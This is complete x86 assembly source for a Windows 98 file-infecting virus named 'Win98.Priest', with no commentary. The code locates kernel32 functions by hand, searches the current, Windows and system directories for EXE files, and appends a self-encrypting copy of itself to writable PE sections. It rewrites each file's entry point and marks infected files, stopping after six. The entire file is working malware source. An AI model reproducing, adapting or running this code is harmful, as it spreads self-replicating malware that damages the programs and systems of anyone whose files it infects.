; Win98.Priest
.386
.model flat
extrn      ExitProcess:PROC
KER32 equ 0bff70000h
Limit equ 0000h
addname equ 0004h
addfun  equ 0008h
addord  equ 000Ch
create  equ 0010h
close   equ 0014h
rfile   equ 0018h
ffind   equ 001ch
nfind   equ 0020h
white   equ 0024h
fpoin   equ 0028h
getw    equ 002ch
gets    equ 0030h
getc    equ 0034h
srchc   equ 0038h
getp    equ 003ch
shand   equ 0040h
fhand   equ 0044h
reads   equ 0048h
OLDEDI  equ 004ch
chkif   equ 0050h
chkdi   equ 0054h
WICHI   equ 0058h
exew    equ 005ch
DATAA   equ 0200h
heads   equ 0300h
.code
Start_Virus:
Call Delta_Offset
Delta_Offset:
Pop Ebp
Sub Ebp,Offset Delta_Offset
pushad
KEY_CODE:
mov EAX,00h
LEA eSI,[VIRUS_BODY+EBP]
mov ecx,End_Virus - VIRUS_BODY -4
KEYCODE:
XOR DWORD ptr [esi],eax
add esi,1
xchg al,ah
ror eax,1
loop KEYCODE
VIRUS_BODY:
popad
push eax
mov eax,[OLDIP+ebp]
add eax,400000h
push eax
call Scan_DATA
mov EDI,ESI
add ESI,6
cmp word ptr [esi],0
je  R_IP
xor ecx,ecx
mov cx,[esi]
add ESI,0f2h
add ESI,24h
add edi,0f8h
CHk_se:
mov eax,[esi]
and eax,0c0000000h
cmp eax,0c0000000h
jne Next_Se
mov eax,[edi+8h]
mov ebx,511
add eax,ebx
xor edx,edx
inc ebx
div ebx
mul ebx
sub eax,[edi+10h]
cmp eax,700h+(W_ENC_END - W_ENC)
jge  OK_SE
Next_Se:
add esi,28h
add edi,28h
loop CHk_se
JMP R_IP
OK_SE:
mov esi,[edi+0ch]
add esi,[edi+10h]
add esi,400000h
mov ebp,ESI
xor eax,eax
mov esi,KER32+3ch
lodsw
add eax,KER32
cmp dword ptr [eax],00004550h
jne R_IP
mov esi,[eax+78h]
add esi,24
add esi,KER32
lodsd
add eax,KER32
mov [ebp+Limit],eax
lodsd
add eax,KER32
mov [ebp+addfun],eax
lodsd
add eax,KER32
mov [ebp+addname],eax
lodsd
add eax,KER32
mov [ebp+addord],eax
pop eax
pop ebx
push ebx
push eax
mov esi,ebx
add esi,offset gp - Start_Virus
mov ebx,esi
mov edi,[ebp+addname]
mov edi,[edi]
add edi,KER32
xor ecx,ecx
call FIND_SRC
shl ecx,1
mov esi,[ebp+addord]
add esi,ecx
xor eax,eax
mov ax,word ptr [esi]
shl eax,2
mov esi,[ebp+addfun]
add esi,eax
mov edi,[esi]
add edi,KER32
mov [getp+ebp],edi
mov ebx,create
pop eax
pop edi
push edi
push eax
add edi,offset cf - Start_Virus
FIND_FUN:
push edi
push KER32
call [getp+ebp]
mov [ebx+ebp],eax
add ebx,4
cmp ebx,getp
je  OK_FIND_FILE
mov al,0
repne scasb
jmp FIND_FUN
OK_FIND_FILE:
lea eax,[ebp+exew]
push eax
push 100h - 58h
call [getc+ebp]
or eax,eax
je CHG_DIR
OK_EXE:
lea esi,[ebp+DATAA]
push esi
lea edi,[ebp+exew]
push edi
scan_dir:
cmp byte ptr [edi],00h
je ok_make_exe
add edi,1
jmp scan_dir
ok_make_exe:
mov al,''
stosb
mov dword ptr [ebp+WICHI],edi
mov ax,'.*'
stosw
mov eax,'EXE'
stosd
call [ebp+ffind]
mov [ebp+shand],eax
cmp eax,-1
je R_IP
mov eax,0
open_file:
cmp byte ptr [ebp+DATAA+2ch+eax],'v'
je NEXT_FILE
cmp byte ptr [ebp+DATAA+2ch+eax],'n'
je NEXT_FILE
cmp byte ptr [ebp+DATAA+2ch+eax],'V'
je NEXT_FILE
cmp byte ptr [ebp+DATAA+2ch+eax],'N'
je NEXT_FILE
cmp byte ptr [ebp+DATAA+2ch+eax],0
je open_file_start
add eax,1
jmp open_file
open_file_start:
mov edi,dword ptr [ebp+WICHI]
mov ecx,20
lea esi,[ebp+DATAA+2ch]
repz movsb
push 0
push 0
push 3
push 0
push 0
push 0c0000000h
lea eax,[ebp+exew]
push eax
call [ebp+create]
mov [ebp+fhand],eax
cmp eax,-1
je File_Close
mov ecx,400h
lea edx,[ebp+heads]
lea eax,[ebp+reads]
push 0
push eax
push ecx
push edx
push dword ptr [ebp+fhand]
call [ebp+rfile]
cmp eax,0
je File_Close
cmp word ptr [ebp+heads],'ZM'
jne File_Close
xor eax,eax
lea esi,[ebp+heads+3ch]
lodsw
add eax,ebp
add eax,heads
mov esi,eax
lea ebx,[ebp+heads+400h]
cmp eax,ebx
jg  File_Close
cmp word ptr [eax],'EP'
jne File_Close
cmp dword ptr [eax+34h],400000h
jne File_Close
cmp word ptr [ebp+heads+12h],'^^'
je File_Close
cmp word ptr [esi+6],6
jg File_Close
xor ecx,ecx
mov edi,esi
mov cx,word ptr [esi+6]
add edi,0f8h
CHK_DATA:
add edi,24h
mov eax,dword ptr [edi]
and eax,0c0000000h
cmp eax,0c0000000h
je  OK_INFECT
add edi,4h
loop CHK_DATA
jmp File_Close
OK_INFECT:
mov eax,[ebp+DATAA+20h]
call F_SEEK
mov edi,[esi+28h]
pop ebx
pop eax
push eax
push ebx
add eax,offset OLDIP - Start_Virus
mov dword ptr [eax],edi
mov eax,offset End_Virus - Start_Virus
mov ecx,[esi+3ch]
add eax,ecx
xor edx,edx
div ecx
mul ecx
add dword ptr [esi+50h],eax
mov ecx,eax
pop eax
pop ebx
mov edx,ebx
push ebx
push eax
push ecx
push ecx
mov ecx,End_Virus - Start_Virus
pushad
push edx
add edx,offset W_ENC - Start_Virus
mov esi,edx
lea ebp,[ebp+heads]
add ebp,400h
mov edi,ebp
push edi
mov cx,offset W_ENC_END - W_ENC
repz movsb
pop edi
jmp edi
r_body:
popad
pop ecx
sub ecx,offset End_Virus - Start_Virus
mov edx,400000h
call fwrite
mov eax,[ebp+DATAA+20h]
mov ecx,[esi+3ch]
mov edx,0
div ecx
push edx
push eax
mov edi,esi
mov ax,word ptr [esi+6]
sub eax,1
mov ecx,28h
mul ecx
add eax,0f8h
add edi,eax
xor edx,edx
mov eax,[edi+14h]
mov ecx,[esi+3ch]
div ecx
pop edx
sub edx,eax
push edx
mov eax,[edi+10h]
sub eax,1
add eax,ecx
xor edx,edx
div ecx
mov ebx,eax
pop eax
sub eax,ebx
mul ecx
pop edx
add eax,edx
add dword ptr [esi+50h],eax
mov ebx,[edi+0ch]
add ebx,[edi+10h]
add ebx,eax
mov [esi+28h],ebx
pop ebx
add ebx,eax
add [edi+8h],ebx
add [edi+10h],ebx
mov [edi+24h],0c0000040h
mov word ptr [ebp+heads+12h],'^^'
mov eax,0
call F_SEEK
lea edx,[ebp+heads]
mov ecx,400h
call fwrite
inc dword ptr chkif[ebp]
File_Close:
push dword ptr [ebp+fhand]
call [ebp+close]
cmp dword ptr chkif[ebp],6
je CHG_DIR
NEXT_FILE:
lea eax,[ebp+DATAA]
push eax
push dword ptr [ebp+shand]
call [ebp+nfind]
cmp eax,0
je CHG_DIR
jmp open_file
CHG_DIR:
push dword ptr [shand+ebp]
call [ebp+srchc]
cmp dword ptr chkif[ebp],6
je R_IP
cmp dword ptr chkdi[ebp],1
jg CHG_DIR_2
add dword ptr chkdi[ebp],2
push 100h-58h
lea eax,[ebp+exew]
push eax
call [ebp+getw]
or eax,eax
je CHG_DIR_2
jmp OK_EXE
CHG_DIR_2:
cmp dword ptr chkdi[ebp],2
jg R_IP
add dword ptr chkdi[ebp],1
push 100h-58h
lea eax,[ebp+exew]
push eax
call [ebp+gets]
or eax,eax
je R_IP
jmp OK_EXE
Scan_DATA:
mov esi,400000h
mov cx,600h
Scan_PE:
cmp dword ptr [esi],00004550h
je R_CO
inc esi
loop Scan_PE
R_IP:
pop eax
pop ebx
jmp eax
R_CO:
ret
FIND_SRC:
mov esi,ebx
X_M:
cmpsb
jne FIND_SRC_2
cmp byte ptr [edi],0
je R_CO
jmp X_M
FIND_SRC_2:
inc cx
cmp cx,[ebp+Limit]
jge NOT_SRC
add dword ptr [ebp+addname],4
mov edi,[ebp+addname]
mov edi,[edi]
add edi,KER32
jmp FIND_SRC
NOT_SRC:
pop esi
jmp R_IP
F_SEEK:
push 0
push 0
push eax
push dword ptr [ebp+fhand]
call [ebp+fpoin]
ret
W_ENC:
in al,40h
xchg al,ah
in al,40h
add eax,edi
add edi,offset ENCRY_E - W_ENC +1
mov dword ptr [edi],eax
pop edx
add edx,offset KEY_CODE - Start_Virus +1
mov dword ptr [edx],eax
popad
pushad
mov esi,edx
add esi,offset VIRUS_BODY - Start_Virus
mov ecx,offset End_Virus - VIRUS_BODY -4
call ENCRY_E
popad
pushad
call fwrite
popad
pushad
mov esi,edx
add esi,offset VIRUS_BODY - Start_Virus
mov ecx,offset End_Virus - VIRUS_BODY -4
call ENCRY_E
popad
pushad
add edx,offset r_body - Start_Virus
jmp edx
ENCRY_E:
mov eax,00h
ENCRY:
xor dword ptr [esi],eax
xchg al,ah
ror eax,1
inc esi
loop ENCRY
ret
fwrite:
push 0
lea eax,[ebp+reads]
push eax
push ecx
push edx
push dword ptr [ebp+fhand]
call [ebp+white]
ret
W_ENC_END:
cf db 'CreateFileA',0
cl db '_lclose',0
rf db 'ReadFile',0
ff db 'FindFirstFileA',0
fn db 'FindNextFileA',0
wf db 'WriteFile',0
sf db 'SetFilePointer',0
gw db 'GetWindowsDirectoryA',0
gs db 'GetSystemDirectoryA',0
gc db 'GetCurrentDirectoryA',0
fc db 'FindClose',0
gp db 'GetProcAddress',0
vn db 'Win98.Priest'
   db 'SVS/COREA/MOV'
OLDIP  dd F_END - 400000h
End_Virus:
F_END:
push 0
call ExitProcess

end Start_Virus

